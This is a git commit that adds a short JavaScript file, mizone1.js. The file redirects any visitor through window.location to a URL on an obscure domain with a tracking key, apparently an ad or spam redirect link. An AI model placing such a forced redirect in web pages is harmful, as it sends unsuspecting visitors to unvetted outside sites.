ed054ab8398cd9bd88c5b7e6688f021fa18b53e6
leswarokojit <84512579+leswarokojit@users.noreply.github.com>
2021-05-25 16:31:42 +0800

    Create mizone1.js

---
+++ mizone1.js
@@ -0,0 +1,6 @@
+var dataUrl = [
+
+  'https://wonderfullytumultbizarre.com/xehjv0hgr?key=c9955a9940bafccb93ff39894f51ad31'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
